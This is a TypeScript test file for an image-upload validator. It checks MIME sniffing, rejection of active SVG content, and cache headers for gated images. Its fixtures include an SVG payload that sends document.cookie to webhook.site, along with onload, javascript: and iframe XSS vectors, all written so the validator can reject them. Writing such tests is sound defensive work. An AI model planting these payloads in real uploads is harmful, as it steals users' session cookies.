/**
 * Uploaded images are served from our own origin. The risk: storing a file
 * under a type the client claimed — an SVG document sent as "image/png" — or
 * an SVG carrying script, as the 2026-10-29 probe's avatars did.
 */

import { describe, it, expect } from "vitest"
import { IMAGE_TYPES_WITH_SVG, RASTER_IMAGE_TYPES, readImageUpload, uploadedImageResponse } from "./uploaded-image"

const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0])
const DIAGRAM = `<?xml version="1.0"?>\n<!DOCTYPE svg>\n<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div>Buy</div></foreignObject></svg>`
const PAYLOAD = `<svg xmlns="http://www.w3.org/2000/svg"><script>new Image().src='https://webhook.site/x?'+document.cookie</script></svg>`

const upload = (bytes: Buffer | string, claimedType: string) => new File([typeof bytes === "string" ? bytes : new Uint8Array(bytes)], "f", { type: claimedType })

describe("readImageUpload", () => {
  it("stores the type the bytes are, not the one the client claimed", async () => {
    const result = await readImageUpload(upload(PNG, "image/svg+xml"), IMAGE_TYPES_WITH_SVG, 1024)
    expect(result).toMatchObject({ mimeType: "image/png" })
  })

  it("refuses an SVG where only raster images are allowed, whatever it claims to be", async () => {
    const result = await readImageUpload(upload(DIAGRAM, "image/png"), RASTER_IMAGE_TYPES, 4096)
    expect(result).toEqual({ error: "Image must be PNG, JPEG, WebP" })
  })

  it("accepts a draw.io/Mermaid-style diagram where SVG is allowed", async () => {
    const result = await readImageUpload(upload(DIAGRAM, "image/svg+xml"), IMAGE_TYPES_WITH_SVG, 4096)
    expect(result).toMatchObject({ mimeType: "image/svg+xml" })
  })

  it.each([
    PAYLOAD,
    `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`,
    `<svg/onload=alert(1) xmlns="http://www.w3.org/2000/svg"></svg>`,
    `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>x</text></a></svg>`,
    `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="/api/users/x/avatar"></iframe></foreignObject></svg>`,
  ])("refuses an SVG with active content: %s", async (svg) => {
    const result = await readImageUpload(upload(svg, "image/svg+xml"), IMAGE_TYPES_WITH_SVG, 4096)
    expect(result).toEqual({ error: "SVG images can't contain scripts, event handlers or embedded frames" })
  })

  it("refuses bytes that aren't an image at all", async () => {
    const result = await readImageUpload(upload("<html><script>x</script></html>", "image/png"), IMAGE_TYPES_WITH_SVG, 4096)
    expect(result).toEqual({ error: "Image must be PNG, JPEG, WebP, SVG" })
  })
})

// Security review 2026-11: paywalled strategy images went out as "public",
// so the CDN served a member's copy to anyone for five minutes.
describe("uploadedImageResponse caching", () => {
  it("lets shared caches keep public images (avatars, logos) briefly", () => {
    expect(uploadedImageResponse(PNG, "image/png").headers.get("Cache-Control")).toBe("public, max-age=300")
  })

  it("keeps gated images out of every shared cache", () => {
    expect(uploadedImageResponse(PNG, "image/png", { gated: true }).headers.get("Cache-Control")).toBe("private, no-store")
  })
})
